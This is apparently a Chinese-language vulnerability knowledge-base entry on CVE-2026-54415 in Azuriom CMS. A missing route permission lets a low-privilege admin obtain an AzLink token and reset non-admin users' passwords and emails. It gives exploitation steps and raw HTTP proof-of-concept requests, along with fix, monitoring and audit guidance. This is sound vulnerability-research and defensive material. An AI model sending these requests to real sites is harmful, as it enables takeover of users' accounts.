---
id: web-generic-auth-azuriom-servers-route-missing-gate-token-account-takeover
title: Azuriom 服务器管理路由缺权限中间件：低权管理员签发 AzLink Token 接管任意非管理员账号
type: scenario
domain: web
path: web/generic/auth
technique: missing-route-gate-issues-integration-token-account-takeover
aliases:
- CVE-2026-54415
- Azuriom 越权
- Azuriom 账号接管
- admin.servers 中间件缺失
- AzLink Token 滥用
- 低权限管理员提权
- Laravel 路由缺 can 中间件
- VerifyServerToken 无范围校验
tags:
- php
- laravel
- azuriom
- authz
- vertical-privilege-escalation
- account-takeover
- missing-middleware
- api-token
- cve-2026-54415
cve:
- CVE-2026-54415
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Azuriom < v1.2.11（漏洞 commit b505807；修复 commit 4b744bc 新增 can:admin.servers 中间件）
verification:
  verified_by: verifier-V30
  verified_at: '2026-11-05T03:19:10+08:00'
  notes: 已对照原文与12张截图核对路由缺can中间件/AzLink token/API改密改邮箱链路；PoC未在本会话执行，文章演示账户表与正文权限描述有自相矛盾（表格写含admin.servers，正文说不含），以正文与截图为准
---

## 一句话结论

Azuriom CMS `< v1.2.11` 的 `routes/admin.php` 中，服务器管理路由遗漏了 `can:admin.servers` 权限中间件，任何只有基础后台权限（`admin.access`）的低权限管理员都能创建游戏服务器并取得一个长期有效的 AzLink Token；该 Token 被 `/api/azlink/password` 与 `/api/azlink/email` 只做“存在性校验”，于是可以修改任意非管理员用户的密码和邮箱，完成账号接管。

## 原理

- Azuriom 用 Laravel Gate 做两级权限：`admin.access` 只代表能进后台；具体模块还需 `admin.settings`、`admin.pages`、`admin.servers` 等 Gate。其他 admin 路由都正确加了 `middleware('can:...')`，只有 `servers` 这一组被遗漏。
- 因此低权限管理员访问 `/admin/servers` 返回 200，拥有完整的服务器增删改查；`ServerController::store()` 创建 `mc-azlink` 服务器时自动生成 `Str::random(32)` 的 token 并写入 `servers.token`。
- 编辑页通过 `getLinkCommand()` 把 token 明文拼进 `/azlink setup <url> <token>` 命令展示，低权限管理员可直接复制。
- `VerifyServerToken` 中间件只做 `Server::firstWhere('token', $token)`，检查 token 是否存在；不校验调用者身份、不限制 token 能操作哪些用户、不设置有效期或使用次数。
- `/api/azlink/password` 与 `/api/azlink/email` 以 `game_id` 定位用户，只拒绝 `$user->isAdmin()`，对普通用户直接 `update` 密码/邮箱；前者还触发 `PasswordReset` 事件，后者发送邮箱验证通知。
- 攻击链的关键不是单个越权点，而是“低权限路由签发了一个可跨对象使用的集成凭据”：权限边界在路由层失守，Token 层又没有作用域，最终落到用户凭据修改的 sink。
- `mc-azlink` 类型的 `verifyLink()` 硬编码返回 true，创建服务器必定成功，不需要真实 Minecraft 服务器配合。

## 触发条件

- 目标为 Azuriom `< v1.2.11`（漏洞 commit `b505807`），且未手动打修复补丁。
- 攻击者拥有一个 `is_admin=1` 但只有 `admin.access`、没有 `admin.servers` 的低权限管理员账号。
- `/admin/servers` 可达；`mc-azlink` 服务器类型可用。
- 目标存在普通（非管理员）用户，且其 `game_id` 可枚举/已知（API 以 `game_id` 定位）。
- 若目标用户 `isAdmin()` 为真，API 直接返回 204 但不修改，无法用该链接管管理员。

## 利用步骤

1. 用低权限管理员登录（`/user/login`），取得会话 Cookie。
2. 访问 `GET /admin/servers`，确认返回 200 且能看到服务器管理界面（正常应 403）。
3. 创建 `mc-azlink` 类型服务器：`POST /admin/servers`（或 PUT 编辑），系统生成 32 位 token。
4. 打开 `/admin/servers/{id}/edit`，从 `/azlink setup <url> <token>` 中提取 token。
5. 用 token 调 `POST /api/azlink/password`，body `{"game_id":"<victim_game_id>","password":"<new>"}`，请求头 `Azuriom-Link-Token: <token>`；返回 204 即修改成功。
6. 可选：调 `POST /api/azlink/email` 把受害者邮箱改成攻击者邮箱，触发验证/重置流程。
7. 用新密码登录受害者账号，确认账号接管；可进一步调用 `/api/azlink/user/{id}/money/add` 等接口扩大影响。

## PoC

```http
GET /admin/servers HTTP/1.1
Host: target
Cookie: azuriom_session=<low-priv-admin-session>
# 预期：HTTP 200（漏洞版），修复版应为 403
```

```http
POST /admin/servers HTTP/1.1
Host: target
Cookie: azuriom_session=<low-priv-admin-session>
Content-Type: application/x-www-form-urlencoded

_token=<csrf>&name=EvilServer&type=mc-azlink&address=127.0.0.1&port=25565&azlink-ping=on&azlink-custom-port=on&azlink-port=8080&home_display=on&join_url=
# 创建后到 /admin/servers/{id}/edit 读取：/azlink setup http://target/ <32位token>
```

```http
POST /api/azlink/password HTTP/1.1
Host: target
Azuriom-Link-Token: <32位token>
Content-Type: application/json

{"game_id":"victim001","password":"hacked124"}
# 预期：HTTP 204 No Content；再用新密码登录受害者账号
```

```http
POST /api/azlink/email HTTP/1.1
Host: target
Azuriom-Link-Token: <32位token>
Content-Type: application/json

{"game_id":"victim001","email":"hacked@evil.com"}
```

## 变体与关联

- 变体（其他 AzLink API）：同一 token 还可调用 `/api/azlink/user/{id}` 读取资料、`/api/azlink/user/{id}/money/add` 增加游戏货币；影响面取决于 API 暴露的功能。
- 变体（token 来源）：任何能创建服务器的角色/入口都会得到一个可用于用户管理的 Token；若站点允许普通用户创建服务器，门槛更低。
- 变体（同框架其他路由）：Laravel 中“大部分路由加了 `can:`，个别漏加”是常见模式；可用 `php artisan route:list` 与路由文件对照，找出缺少中间件的 admin 路由。
- 关联：[[web-generic-auth-missing-function-level-role-check]]（只验登录不验角色的通用垂直越权）、[[web-generic-auth-jwt-signature-only-role-bypass]]（只验签名不验角色的另一类鉴权缺口）。
- 边界：修复版给整组 servers 路由加了 `can:admin.servers`；若站点把低权限管理员全部移除，或 API 被网关阻断，链不成立；管理员账号受 `isAdmin()` 保护，不能通过该 API 直接改管理员密码。

## 检测与防御

- 修复：升级到 Azuriom ≥ v1.2.11，或应用 commit `4b744bc`，把 `servers` 路由包进 `Route::middleware('can:admin.servers')->group(...)`。
- 授权：所有 admin 子路由逐条核对 Gate；不要用“已登录/已进后台”代替模块级权限；路由清单与权限矩阵做自动化比对。
- Token 设计：AzLink Token 应绑定服务器与允许的操作范围（scope），设置有效期与轮换机制；`VerifyServerToken` 除存在性外应校验来源、IP/域名、用途。
- API 加固：修改密码/邮箱的 API 应要求用户本人确认或一次性重置令牌，不应由集成 Token 直接改任意用户；对高危 API 增加审计与速率限制。
- 监控：`servers` 表异常新增（尤其低权限管理员创建 `mc-azlink`）、`/api/azlink/password`、`/api/azlink/email`、`/api/azlink/user/*/money/add` 的调用；同一 token 修改多个 `game_id`；低权限管理员访问 `/admin/servers` 返回 200。
- 审计：`grep -rn "Route::.*server" routes/ | grep -v middleware`，并对照其他 admin 路由的 `can:` 覆盖情况。
